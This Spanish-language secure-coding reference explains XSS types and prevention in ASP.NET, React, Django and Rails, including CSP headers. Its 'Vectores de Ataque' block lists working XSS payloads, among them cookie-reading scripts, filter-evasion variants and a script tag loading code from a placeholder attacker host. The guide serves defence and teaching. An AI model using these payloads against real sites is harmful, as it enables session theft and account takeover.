# Cross-Site Scripting (XSS) - Analisis en Profundidad

> Skill: security-audit | Version: 3.5.0

3 tipos de XSS, 20+ vectores de ataque, prevencion por framework.

> Ver tambien: `owasp/owasp-top10-2025.md` (A05), `owasp/owasp-frameworks.md`

---

## Tipos de XSS

| Tipo | Descripcion | Persistencia |
|------|-------------|:------------:|
| **XSS Reflejado** | Payload en URL/solicitud, reflejado en la respuesta | No |
| **XSS Almacenado** | Payload almacenado en BD, servido a otros usuarios | Si |
| **XSS basado en DOM** | Payload ejecutado via JavaScript del lado del cliente | No |

---

## Vectores de Ataque Comunes

```html
<!-- Basico -->
<script>alert(document.cookie)</script>

<!-- Manejadores de eventos -->
<img src=x onerror=alert(1)>
" onfocus="alert(document.cookie)
<a href="javascript:alert(1)">clic aqui</a>

<!-- Tecnicas de evasion de filtros -->
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script >
%3cscript%3ealert(1)%3c/script%3e
<SCRIPT a=">">SRC="https://atacante/xss.js"></SCRIPT>

<!-- Evasion por HPP (Contaminacion de Parametros HTTP) -->
param=<script&param=>[...]</&param=script>

<!-- Basado en DOM -->
document.write("NO CONFIABLE: " + document.location.hash)
element.innerHTML = userInput
```

---

## Prevencion por Lenguaje

### C# / ASP.NET

```csharp
// ASP.NET Core - Auto-escapado en Razor por defecto
// SEGURO - @Model.Nombre ya esta escapado

// INSEGURO - Html.Raw con entrada del usuario
@Html.Raw(Model.Descripcion)  // NUNCA con datos del usuario

// Sanitizacion con HtmlSanitizer (NuGet)
var sanitizer = new HtmlSanitizer();
var htmlSeguro = sanitizer.Sanitize(htmlDelUsuario);

// CSP header en middleware
app.Use(async (context, next) =>
{
    context.Response.Headers.Append(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self'");
    await next();
});
```

### JavaScript / React

```javascript
// INSEGURO - innerHTML con entrada del usuario
document.getElementById('content').innerHTML = userInput;

// SEGURO - textContent (sin interpretacion HTML)
document.getElementById('content').textContent = userInput;

// SEGURO - Sanitizacion con DOMPurify
import DOMPurify from 'dompurify';
document.getElementById('content').innerHTML = DOMPurify.sanitize(userInput);

// React - auto-escapado por defecto
// INSEGURO
<div dangerouslySetInnerHTML={{__html: userInput}} />
// SEGURO
<div>{userInput}</div>

// SEGURO - Parseo JSON (nunca eval)
const data = JSON.parse(receivedData);  // Seguro
// const data = eval('(' + receivedData + ')');  // PELIGROSO
```

### Python / Django

```python
# Django - auto-escapado habilitado por defecto
# SEGURO - Las plantillas Django auto-escapan
{{ user_input }}

# INSEGURO - marcar como seguro
{{ user_input|safe }}
```

### Ruby / Rails

```ruby
# Rails - NUNCA usar raw o html_safe con entrada del usuario
<%= raw @product.name %>         # INSEGURO
<%== @product.name %>            # INSEGURO
<%= @product.name.html_safe %>   # INSEGURO
<%= @product.name %>             # SEGURO (auto-escapado)
```

---

## Cabecera CSP (Content Security Policy)

```html
<!-- CSP estricta -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://cdn.confiable.com;">

<!-- CSP con nonce (mas segura) -->
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

---

## Tabla de Proteccion por Framework

| Framework | Auto-escapado | Funcion insegura | Sanitizacion |
|-----------|:-------------:|------------------|--------------|
| **ASP.NET Razor** | Si (`@`) | `Html.Raw()` | HtmlSanitizer NuGet |
| **React** | Si (`{}`) | `dangerouslySetInnerHTML` | DOMPurify |
| **Django** | Si (`{{ }}`) | `|safe` filter | bleach |
| **Rails** | Si (`<%= %>`) | `raw`, `html_safe` | sanitize helper |
| **Angular** | Si (binding) | `bypassSecurityTrust*` | DomSanitizer |

---

*Pattern v3.7.0*
